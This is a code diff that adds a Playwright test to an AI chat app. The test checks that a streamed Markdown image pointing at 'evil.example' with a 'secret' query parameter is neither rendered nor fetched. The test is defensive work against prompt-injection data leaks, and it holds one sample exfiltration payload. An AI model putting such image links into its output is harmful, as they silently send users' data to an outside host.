@@ -59,6 +59,61 @@ test('a reply streams into the thread as rendered markdown', async () => {
   }
 })
 
+test('复现：a remote Markdown image renders no img and sends no request to its host', async () => {
+  fake = await startFakeAnthropic({
+    chunks: [
+      'Before image.\n\n',
+      '![x](',
+      'https://evil.example/p.png?d=secret',
+      ')\n\nAfter image.',
+    ],
+    delayMs: 30,
+  })
+  const userData = makeUserDataDir('chat-blocked-image')
+  seedConfig(userData, { locale: 'en' })
+  const { app, page } = await launchTenon({ userData, env: providerEnv(fake.baseURL) })
+  try {
+    const requests: string[] = []
+    page.on('request', (request) => {
+      if (new URL(request.url()).hostname === 'evil.example') requests.push(request.url())
+    })
+    // A broken renderer must not contact the external host, even if CSP is later relaxed.
+    await page.route('https://evil.example/**', (route) => route.abort())
+    await page.evaluate(() => {
+      const state = globalThis as unknown as { imageCspViolations: string[] }
+      state.imageCspViolations = []
+      document.addEventListener('securitypolicyviolation', (event) => {
+        if (event.blockedURI.includes('evil.example')) {
+          state.imageCspViolations.push(event.blockedURI)
+        }
+      })
+    })
+    await page.getByTestId('composer-input').fill('show an image')
+    await page.keyboard.press('Enter')
+    const text = page.getByTestId('assistant-text')
+    await expect(text).toContainText('After image.')
+    await expect(text).toHaveAttribute('data-streaming', 'false')
+    await expect(text.locator('img')).toHaveCount(0)
+    await expect(text).not.toContainText('Image blocked')
+    // Let the completed render paint and dispatch any pending resource/CSP events.
+    await page.evaluate(
+      () =>
+        new Promise<void>((resolve) =>
+          requestAnimationFrame(() => requestAnimationFrame(() => resolve())),
+        ),
+    )
+    expect(requests).toEqual([])
+    // CSP should not have to rescue a resource request the Markdown renderer tried to make.
+    expect(
+      await page.evaluate(
+        () => (globalThis as unknown as { imageCspViolations: string[] }).imageCspViolations,
+      ),
+    ).toEqual([])
+  } finally {
+    await app.close()
+  }
+})
+
 test('Stop aborts the in-flight reply down to the socket and keeps the partial text', async () => {
   // Far longer than the test needs (30 s): Stop must find the reply still streaming even on
   // a slow CI runner. The abort ends the stream early, so the test never waits for it.
